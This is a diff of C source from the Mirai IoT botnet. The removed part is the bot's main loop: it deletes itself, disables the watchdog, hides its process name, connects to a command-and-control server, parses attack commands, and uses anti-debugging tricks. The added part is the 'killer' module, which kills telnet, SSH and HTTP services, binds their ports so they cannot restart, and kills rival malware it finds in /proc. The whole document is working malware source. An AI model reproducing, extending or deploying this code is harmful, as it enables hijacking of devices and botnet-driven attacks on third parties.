@@ -3,531 +3,561 @@
 #ifdef DEBUG
 #include <stdio.h>
 #endif
-#include <stdlib.h>
 #include <unistd.h>
-#include <sys/socket.h>
+#include <stdlib.h>
 #include <arpa/inet.h>
-#include <sys/prctl.h>
-#include <sys/select.h>
+#include <linux/limits.h>
+#include <sys/types.h>
+#include <dirent.h>
 #include <signal.h>
 #include <fcntl.h>
-#include <sys/ioctl.h>
 #include <time.h>
-#include <errno.h>
 
 #include "includes.h"
-#include "table.h"
-#include "rand.h"
-#include "attack.h"
 #include "killer.h"
-#include "scanner.h"
+#include "table.h"
 #include "util.h"
-#include "resolv.h"
 
-static void anti_gdb_entry(int);
-static void resolve_cnc_addr(void);
-static void establish_connection(void);
-static void teardown_connection(void);
-static void ensure_single_instance(void);
-static BOOL unlock_tbl_if_nodebug(char *);
+int killer_pid;
+char *killer_realpath;
+int killer_realpath_len = 0;
 
-struct sockaddr_in srv_addr;
-int fd_ctrl = -1, fd_serv = -1;
-BOOL pending_connection = FALSE;
-void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
+void killer_init(void)
+{
+	int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
+	uint32_t scan_counter = 0;
+	struct sockaddr_in tmp_bind_addr;
+
+	// Let parent continue on main thread
+	killer_pid = fork();            //As coment says, makes a child and the parent returns to main. child then continues to dissable certain services 
+	if (killer_pid > 0 || killer_pid == -1)
+		return;
+
+	tmp_bind_addr.sin_family = AF_INET;
+	tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
+
+	// Kill telnet service and prevent it from restarting
+#ifdef KILLER_REBIND_TELNET
+#ifdef DEBUG
+	printf("[killer] Trying to kill port 23\n");
+#endif
+	if (killer_kill_by_port(htons(23)))
+	{
+#ifdef DEBUG
+		printf("[killer] Killed tcp/23 (telnet)\n");
+#endif
+	}
+	else {
+#ifdef DEBUG
+		printf("[killer] Failed to kill port 23\n");
+#endif
+	}
+	tmp_bind_addr.sin_port = htons(23);
+
+	if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+	{
+		bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
+		listen(tmp_bind_fd, 1);
+	}
+#ifdef DEBUG
+	printf("[killer] Bound to tcp/23 (telnet)\n");
+#endif
+#endif
+
+	// Kill SSH service and prevent it from restarting
+#ifdef KILLER_REBIND_SSH
+	if (killer_kill_by_port(htons(22)))
+	{
+#ifdef DEBUG
+		printf("[killer] Killed tcp/22 (SSH)\n");
+#endif
+	}
+	tmp_bind_addr.sin_port = htons(22);
+
+	if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+	{
+		bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
+		listen(tmp_bind_fd, 1);
+	}
+#ifdef DEBUG
+	printf("[killer] Bound to tcp/22 (SSH)\n");
+#endif
+#endif
+
+	// Kill HTTP service and prevent it from restarting
+#ifdef KILLER_REBIND_HTTP
+	if (killer_kill_by_port(htons(80)))
+	{
+#ifdef DEBUG
+		printf("[killer] Killed tcp/80 (http)\n");
+#endif
+	}
+	tmp_bind_addr.sin_port = htons(80);
+
+	if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+	{
+		bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
+		listen(tmp_bind_fd, 1);
+	}
+#ifdef DEBUG
+	printf("[killer] Bound to tcp/80 (http)\n");
+#endif
+#endif
+
+	// In case the binary is getting deleted, we want to get the REAL realpath
+	sleep(5);
+
+	killer_realpath = malloc(PATH_MAX);
+	killer_realpath[0] = 0;
+	killer_realpath_len = 0;
+
+	if (!has_exe_access())
+	{
+#ifdef DEBUG
+		printf("[killer] Machine does not have /proc/$pid/exe\n");
+#endif
+		return;
+	}
+#ifdef DEBUG
+	printf("[killer] Memory scanning processes\n");
+#endif
+
+	while (TRUE)
+	{
+		DIR *dir;
+		struct dirent *file;
+
+		table_unlock_val(TABLE_KILLER_PROC);
+		if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
+		{
+#ifdef DEBUG
+			printf("[killer] Failed to open /proc!\n");
+#endif
+			break;
+		}
+		table_lock_val(TABLE_KILLER_PROC);
+
+		while ((file = readdir(dir)) != NULL)
+		{
+			// skip all folders that are not PIDs
+			if (*(file->d_name) < '0' || *(file->d_name) > '9')
+				continue;
+
+			char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
+			char status_path[64], *ptr_status_path = status_path;
+			int rp_len, fd, pid = atoi(file->d_name);
+
+			scan_counter++;
+			if (pid <= killer_highest_pid)
+			{
+				if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
+				{
+#ifdef DEBUG
+					printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
+#endif
+					killer_highest_pid = KILLER_MIN_PID;
+				}
+				else
+				{
+					if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
+						sleep(1); // Sleep so we can wait for another process to spawn
+				}
+
+				continue;
+			}
+			if (pid > killer_highest_pid)
+				killer_highest_pid = pid;
+			last_pid_scan = time(NULL);
+
+			table_unlock_val(TABLE_KILLER_PROC);
+			table_unlock_val(TABLE_KILLER_EXE);
+
+			// Store /proc/$pid/exe into exe_path
+			ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+			ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
+			ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
+
+			// Store /proc/$pid/status into status_path
+			ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+			ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
+			ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));
+
+			table_lock_val(TABLE_KILLER_PROC);
+			table_lock_val(TABLE_KILLER_EXE);
+
+			// Resolve exe_path (/proc/$pid/exe) -> realpath
+			if ((rp_len = readlink(exe_path, realpath, sizeof(realpath) - 1)) != -1)
+			{
+				realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
+
+				table_unlock_val(TABLE_KILLER_ANIME);
+				// If path contains ".anime" kill.
+				if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
+				{
+					unlink(realpath);
+					kill(pid, 9);
+				}
+				table_lock_val(TABLE_KILLER_ANIME);
+
+				// Skip this file if its realpath == killer_realpath
+				if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
+					continue;
+
+				if ((fd = open(realpath, O_RDONLY)) == -1)
+				{
+#ifdef DEBUG
+					printf("[killer] Process '%s' has deleted binary!\n", realpath);
+#endif
+					kill(pid, 9);
+				}
+				close(fd);
+			}
+
+			if (memory_scan_match(exe_path))
+			{
+#ifdef DEBUG
+				printf("[killer] Memory scan match for binary %s\n", exe_path);
+#endif
+				kill(pid, 9);
+			}
+
+			/*
+			if (upx_scan_match(exe_path, status_path))
+			{
+#ifdef DEBUG
+				printf("[killer] UPX scan match for binary %s\n", exe_path);
+#endif
+				kill(pid, 9);
+			}
+			*/
+
+			// Don't let others memory scan!!!
+			util_zero(exe_path, sizeof(exe_path));
+			util_zero(status_path, sizeof(status_path));
+
+			sleep(1);
+		}
+
+		closedir(dir);
+	}
 
 #ifdef DEBUG
-static void segv_handler(int sig, siginfo_t *si, void *unused)
-{
-    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
-    exit(EXIT_FAILURE);
+	printf("[killer] Finished\n");
+#endif
 }
-#endif
 
-int main(int argc, char **args)
+void killer_kill(void)
 {
-    char *tbl_exec_succ;
-    char name_buf[32];
-    char id_buf[32];
-    int name_buf_len;
-    int tbl_exec_succ_len;
-    int pgid, pings = 0;
+	kill(killer_pid, 9);
+}
 
-#ifndef DEBUG
-    sigset_t sigs;
-    int wfd;
-
-    // Delete self
-    unlink(args[0]);
-
-    // Signal based control flow
-    sigemptyset(&sigs);
-    sigaddset(&sigs, SIGINT);
-    sigprocmask(SIG_BLOCK, &sigs, NULL);
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGTRAP, &anti_gdb_entry);
-
-    // Prevent watchdog from rebooting device
-    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
-        (wfd = open("/dev/misc/watchdog", 2)) != -1)
-    {
-        int one = 1;
-
-        ioctl(wfd, 0x80045704, &one);
-        close(wfd);
-        wfd = 0;
-    }
-    chdir("/");
-#endif
+BOOL killer_kill_by_port(port_t port)
+{
+	DIR *dir, *fd_dir;
+	struct dirent *entry, *fd_entry;
+	char path[PATH_MAX] = { 0 }, exe[PATH_MAX] = { 0 }, buffer[513] = { 0 };
+	int pid = 0, fd = 0;
+	char inode[16] = { 0 };
+	char *ptr_path = path;
+	int ret = 0;
+	char port_str[16];
 
 #ifdef DEBUG
-    printf("DEBUG MODE YO\n");
-
-    sleep(1);
-
-    struct sigaction sa;
-
-    sa.sa_flags = SA_SIGINFO;
-    sigemptyset(&sa.sa_mask);
-    sa.sa_sigaction = segv_handler;
-    if (sigaction(SIGSEGV, &sa, NULL) == -1)
-        perror("sigaction");
-
-    sa.sa_flags = SA_SIGINFO;
-    sigemptyset(&sa.sa_mask);
-    sa.sa_sigaction = segv_handler;
-    if (sigaction(SIGBUS, &sa, NULL) == -1)
-        perror("sigaction");
+	printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
 #endif
 
-    LOCAL_ADDR = util_local_addr();
+	util_itoa(ntohs(port), 16, port_str);
+	if (util_strlen(port_str) == 2)
+	{
+		port_str[2] = port_str[0];
+		port_str[3] = port_str[1];
+		port_str[4] = 0;
 
-    srv_addr.sin_family = AF_INET;
-    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
-    srv_addr.sin_port = htons(FAKE_CNC_PORT);
+		port_str[0] = '0';
+		port_str[1] = '0';
+	}
+
+	table_unlock_val(TABLE_KILLER_PROC);
+	table_unlock_val(TABLE_KILLER_EXE);
+	table_unlock_val(TABLE_KILLER_FD);
+
+	fd = open("/proc/net/tcp", O_RDONLY);
+	if (fd == -1)
+		return 0;
+
+	while (util_fdgets(buffer, 512, fd) != NULL)
+	{
+		int i = 0, ii = 0;
+
+		while (buffer[i] != 0 && buffer[i] != ':')
+			i++;
+
+		if (buffer[i] == 0) continue;
+		i += 2;
+		ii = i;
+
+		while (buffer[i] != 0 && buffer[i] != ' ')
+			i++;
+		buffer[i++] = 0;
+
+		// Compare the entry in /proc/net/tcp to the hex value of the htons port
+		if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
+		{
+			int column_index = 0;
+			BOOL in_column = FALSE;
+			BOOL listening_state = FALSE;
+
+			while (column_index < 7 && buffer[++i] != 0)
+			{
+				if (buffer[i] == ' ' || buffer[i] == '\t')
+					in_column = TRUE;
+				else
+				{
+					if (in_column == TRUE)
+						column_index++;
+
+					if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
+					{
+						listening_state = TRUE;
+					}
+
+					in_column = FALSE;
+				}
+			}
+			ii = i;
+
+			if (listening_state == FALSE)
+				continue;
+
+			while (buffer[i] != 0 && buffer[i] != ' ')
+				i++;
+			buffer[i++] = 0;
+
+			if (util_strlen(&(buffer[ii])) > 15)
+				continue;
+
+			util_strcpy(inode, &(buffer[ii]));
+			break;
+		}
+	}
+	close(fd);
+
+	// If we failed to find it, lock everything and move on
+	if (util_strlen(inode) == 0)
+	{
+#ifdef DEBUG
+		printf("Failed to find inode for port %d\n", ntohs(port));
+#endif
+		table_lock_val(TABLE_KILLER_PROC);
+		table_lock_val(TABLE_KILLER_EXE);
+		table_lock_val(TABLE_KILLER_FD);
+
+		return 0;
+	}
 
 #ifdef DEBUG
-    unlock_tbl_if_nodebug(args[0]);
-    anti_gdb_entry(0);
+	printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
+#endif
+
+	if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
+	{
+		while ((entry = readdir(dir)) != NULL && ret == 0)
+		{
+			char *pid = entry->d_name;
+
+			// skip all folders that are not PIDs
+			if (*pid < '0' || *pid > '9')
+				continue;
+
+			util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+			util_strcpy(ptr_path + util_strlen(ptr_path), pid);
+			util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));
+
+			if (readlink(path, exe, PATH_MAX) == -1)
+				continue;
+
+			util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+			util_strcpy(ptr_path + util_strlen(ptr_path), pid);
+			util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
+			if ((fd_dir = opendir(path)) != NULL)
+			{
+				while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
+				{
+					char *fd_str = fd_entry->d_name;
+
+					util_zero(exe, PATH_MAX);
+					util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+					util_strcpy(ptr_path + util_strlen(ptr_path), pid);
+					util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
+					util_strcpy(ptr_path + util_strlen(ptr_path), "/");
+					util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
+					if (readlink(path, exe, PATH_MAX) == -1)
+						continue;
+
+					if (util_stristr(exe, util_strlen(exe), inode) != -1)
+					{
+#ifdef DEBUG
+						printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
 #else
-    if (unlock_tbl_if_nodebug(args[0]))
-        raise(SIGTRAP);
+						kill(util_atoi(pid, 10), 9);
 #endif
+						ret = 1;
+					}
+				}
+				closedir(fd_dir);
+			}
+		}
+		closedir(dir);
+	}
 
-    ensure_single_instance();
+	sleep(1);
 
-    rand_init();
+	table_lock_val(TABLE_KILLER_PROC);
+	table_lock_val(TABLE_KILLER_EXE);
+	table_lock_val(TABLE_KILLER_FD);
 
-    util_zero(id_buf, 32);
-    if (argc == 2 && util_strlen(args[1]) < 32)
-    {
-        util_strcpy(id_buf, args[1]);
-        util_zero(args[1], util_strlen(args[1]));
-    }
-
-    // Hide argv0
-    name_buf_len = ((rand_next() % 4) + 3) * 4;
-    rand_alphastr(name_buf, name_buf_len);
-    name_buf[name_buf_len] = 0;
-    util_strcpy(args[0], name_buf);
-
-    // Hide process name
-    name_buf_len = ((rand_next() % 6) + 3) * 4;
-    rand_alphastr(name_buf, name_buf_len);
-    name_buf[name_buf_len] = 0;
-    prctl(PR_SET_NAME, name_buf);
-
-    // Print out system exec
-    table_unlock_val(TABLE_EXEC_SUCCESS);
-    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
-    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
-    write(STDOUT, "\n", 1);
-    table_lock_val(TABLE_EXEC_SUCCESS);
-
-#ifndef DEBUG
-    if (fork() > 0)
-        return 0;
-    pgid = setsid();
-    close(STDIN);
-    close(STDOUT);
-    close(STDERR);
-#endif
-
-    attack_init();
-    killer_init();
-#ifndef DEBUG
-#ifdef MIRAI_TELNET
-    scanner_init();
-#endif
-#endif
-
-    while (TRUE)
-    {
-        fd_set fdsetrd, fdsetwr, fdsetex;
-        struct timeval timeo;
-        int mfd, nfds;
-
-        FD_ZERO(&fdsetrd);
-        FD_ZERO(&fdsetwr);
-
-        // Socket for accept()
-        if (fd_ctrl != -1)
-            FD_SET(fd_ctrl, &fdsetrd);
-
-        // Set up CNC sockets
-        if (fd_serv == -1)
-            establish_connection();
-
-        if (pending_connection)
-            FD_SET(fd_serv, &fdsetwr);
-        else
-            FD_SET(fd_serv, &fdsetrd);
-
-        // Get maximum FD for select
-        if (fd_ctrl > fd_serv)
-            mfd = fd_ctrl;
-        else
-            mfd = fd_serv;
-
-        // Wait 10s in call to select()
-        timeo.tv_usec = 0;
-        timeo.tv_sec = 10;
-        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
-        if (nfds == -1)
-        {
-#ifdef DEBUG
-            printf("select() errno = %d\n", errno);
-#endif
-            continue;
-        }
-        else if (nfds == 0)
-        {
-            uint16_t len = 0;
-
-            if (pings++ % 6 == 0)
-                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
-        }
-
-        // Check if we need to kill ourselves
-        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
-        {
-            struct sockaddr_in cli_addr;
-            socklen_t cli_addr_len = sizeof (cli_addr);
-
-            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
-
-#ifdef DEBUG
-            printf("[main] Detected newer instance running! Killing self\n");
-#endif
-#ifdef MIRAI_TELNET
-            scanner_kill();
-#endif
-            killer_kill();
-            attack_kill_all();
-            kill(pgid * -1, 9);
-            exit(0);
-        }
-
-        // Check if CNC connection was established or timed out or errored
-        if (pending_connection)
-        {
-            pending_connection = FALSE;
-
-            if (!FD_ISSET(fd_serv, &fdsetwr))
-            {
-#ifdef DEBUG
-                printf("[main] Timed out while connecting to CNC\n");
-#endif
-                teardown_connection();
-            }
-            else
-            {
-                int err = 0;
-                socklen_t err_len = sizeof (err);
-
-                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
-                if (err != 0)
-                {
-#ifdef DEBUG
-                    printf("[main] Error while connecting to CNC code=%d\n", err);
-#endif
-                    close(fd_serv);
-                    fd_serv = -1;
-                    sleep((rand_next() % 10) + 1);
-                }
-                else
-                {
-                    uint8_t id_len = util_strlen(id_buf);
-
-                    LOCAL_ADDR = util_local_addr();
-                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
-                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
-                    if (id_len > 0)
-                    {
-                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
-                    }
-#ifdef DEBUG
-                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
-#endif
-                }
-            }
-        }
-        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
-        {
-            int n;
-            uint16_t len;
-            char rdbuf[1024];
-
-            // Try to read in buffer length from CNC
-            errno = 0;
-            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
-            if (n == -1)
-            {
-                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
-                    continue;
-                else
-                    n = 0; // Cause connection to close
-            }
-            
-            // If n == 0 then we close the connection!
-            if (n == 0)
-            {
-#ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
-#endif
-                teardown_connection();
-                continue;
-            }
-
-            // Convert length to network order and sanity check length
-            if (len == 0) // If it is just a ping, no need to try to read in buffer data
-            {
-                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
-                continue;
-            }
-            len = ntohs(len);
-            if (len > sizeof (rdbuf))
-            {
-                close(fd_serv);
-                fd_serv = -1;
-            }
-
-            // Try to read in buffer from CNC
-            errno = 0;
-            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
-            if (n == -1)
-            {
-                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
-                    continue;
-                else
-                    n = 0;
-            }
-
-            // If n == 0 then we close the connection!
-            if (n == 0)
-            {
-#ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
-#endif
-                teardown_connection();
-                continue;
-            }
-
-            // Actually read buffer length and buffer data
-            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
-            len = ntohs(len);
-            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
-
-#ifdef DEBUG
-            printf("[main] Received %d bytes from CNC\n", len);
-#endif
-
-            if (len > 0)
-                attack_parse(rdbuf, len);
-        }
-    }
-
-    return 0;
+	return ret;
 }
 
-static void anti_gdb_entry(int sig)
+static BOOL has_exe_access(void)
 {
-    resolve_func = resolve_cnc_addr;
+	char path[PATH_MAX], *ptr_path = path, tmp[16];
+	int fd, k_rp_len;
+
+	table_unlock_val(TABLE_KILLER_PROC);
+	table_unlock_val(TABLE_KILLER_EXE);
+
+	// Copy /proc/$pid/exe into path
+	ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+	ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
+	ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
+
+	// Try to open file
+	if ((fd = open(path, O_RDONLY)) == -1)
+	{
+#ifdef DEBUG
+		printf("[killer] Failed to open()\n");
+#endif
+		return FALSE;
+	}
+	close(fd);
+
+	table_lock_val(TABLE_KILLER_PROC);
+	table_lock_val(TABLE_KILLER_EXE);
+
+	if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
+	{
+		killer_realpath[k_rp_len] = 0;
+#ifdef DEBUG
+		printf("[killer] Detected we are running out of `%s`\n", killer_realpath);
+#endif
+	}
+
+	util_zero(path, ptr_path - path);
+
+	return TRUE;
 }
 
-static void resolve_cnc_addr(void)
+/*
+static BOOL status_upx_check(char *exe_path, char *status_path)
 {
-    struct resolv_entries *entries;
+	int fd, ret;
 
-    table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
-    table_lock_val(TABLE_CNC_DOMAIN);
-    if (entries == NULL)
-    {
-#ifdef DEBUG
-        printf("[main] Failed to resolve CNC address\n");
-#endif
-        return;
-    }
-    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-    resolv_entries_free(entries);
+	if ((fd = open(exe_path, O_RDONLY)) != -1)
+	{
+		close(fd);
+		return FALSE;
+	}
 
-    table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
-    table_lock_val(TABLE_CNC_PORT);
+	if ((fd = open(status_path, O_RDONLY)) == -1)
+		return FALSE;
 
-#ifdef DEBUG
-    printf("[main] Resolved domain\n");
-#endif
+	while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
+	{
+		if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
+			mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
+			mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
+			mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
+			mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
+		{
+			found = TRUE;
+			break;
+		}
+	}
+
+	//eyy
+
+	close(fd);
+	return FALSE;
 }
+*/
 
-static void establish_connection(void)
+static BOOL memory_scan_match(char *path)
 {
-#ifdef DEBUG
-    printf("[main] Attempting to connect to CNC\n");
-#endif
+	int fd, ret;
+	char rdbuf[4096];
+	char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;
+	int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;
+	BOOL found = FALSE;
 
-    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-    {
-#ifdef DEBUG
-        printf("[main] Failed to call socket(). Errno = %d\n", errno);
-#endif
-        return;
-    }
+	if ((fd = open(path, O_RDONLY)) == -1)
+		return FALSE;
 
-    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
+	table_unlock_val(TABLE_MEM_QBOT);
+	table_unlock_val(TABLE_MEM_QBOT2);
+	table_unlock_val(TABLE_MEM_QBOT3);
+	table_unlock_val(TABLE_MEM_UPX);
+	table_unlock_val(TABLE_MEM_ZOLLARD);
 
-    // Should call resolve_cnc_addr
-    if (resolve_func != NULL)
-        resolve_func();
+	m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
+	m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
+	m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len);
+	m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
+	m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);
 
-    pending_connection = TRUE;
-    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
+	while ((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
+	{
+		if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
+			mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
+			mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
+			mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
+			mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
+		{
+			found = TRUE;
+			break;
+		}
+	}
+
+	table_lock_val(TABLE_MEM_QBOT);
+	table_lock_val(TABLE_MEM_QBOT2);
+	table_lock_val(TABLE_MEM_QBOT3);
+	table_lock_val(TABLE_MEM_UPX);
+	table_lock_val(TABLE_MEM_ZOLLARD);
+
+	close(fd);
+
+	return found;
 }
 
-static void teardown_connection(void)
+static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
 {
-#ifdef DEBUG
-    printf("[main] Tearing down connection to CNC!\n");
-#endif
+	int matches = 0;
 
-    if (fd_serv != -1)
-        close(fd_serv);
-    fd_serv = -1;
-    sleep(1);
+	if (str_len > buf_len)
+		return FALSE;
+
+	while (buf_len--)
+	{
+		if (*buf++ == str[matches])
+		{
+			if (++matches == str_len)
+				return TRUE;
+		}
+		else
+			matches = 0;
+	}
+
+	return FALSE;
 }
 
-static void ensure_single_instance(void)
-{
-    static BOOL local_bind = TRUE;
-    struct sockaddr_in addr;
-    int opt = 1;
 
-    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-        return;
-    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
-    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));
-
-    addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
-    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
-
-    // Try to bind to the control port
-    errno = 0;
-    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
-    {
-        if (errno == EADDRNOTAVAIL && local_bind)
-            local_bind = FALSE;
-#ifdef DEBUG
-        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
-#endif
-
-        // Reset addr just in case
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = INADDR_ANY;
-        addr.sin_port = htons(SINGLE_INSTANCE_PORT);
-
-        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
-        {
-#ifdef DEBUG
-            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
-#endif
-        }
-        
-        sleep(5);
-        close(fd_ctrl);
-        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
-        ensure_single_instance(); // Call again, so that we are now the control
-    }
-    else
-    {
-        if (listen(fd_ctrl, 1) == -1)
-        {
-#ifdef DEBUG
-            printf("[main] Failed to call listen() on fd_ctrl\n");
-            close(fd_ctrl);
-            sleep(5);
-            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
-            ensure_single_instance();
-#endif
-        }
-#ifdef DEBUG
-        printf("[main] We are the only process on this system!\n");
-#endif
-    }
-}
-
-static BOOL unlock_tbl_if_nodebug(char *argv0)
-{
-    // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
-    char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
-    int i, ii = 0, c = 0;
-    uint8_t fold = 0xAF;
-    void (*obf_funcs[]) (void) = {
-        (void (*) (void))ensure_single_instance,
-        (void (*) (void))table_unlock_val,
-        (void (*) (void))table_retrieve_val,
-        (void (*) (void))table_init, // This is the function we actually want to run
-        (void (*) (void))table_lock_val,
-        (void (*) (void))util_memcpy,
-        (void (*) (void))util_strcmp,
-        (void (*) (void))killer_init,
-        (void (*) (void))anti_gdb_entry
-    };
-    BOOL matches;
-
-    for (i = 0; i < 7; i++)
-        c += (long)obf_funcs[i];
-    if (c == 0)
-        return FALSE;
-
-    // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
-    for (i = 0; i < sizeof (buf_src); i += 3)
-    {
-        char tmp = buf_src[i];
-
-        buf_dst[ii++] = buf_src[i + 1];
-        buf_dst[ii++] = tmp;
-
-        // Meaningless tautology that gets you right back where you started
-        i *= 2;
-        i += 14;
-        i /= 2;
-        i -= 7;
-
-        // Mess with 0xAF
-        fold += ~argv0[ii % util_strlen(argv0)];
-    }
-    fold %= (sizeof (obf_funcs) / sizeof (void *));
-    
-#ifndef DEBUG
-    (obf_funcs[fold])();
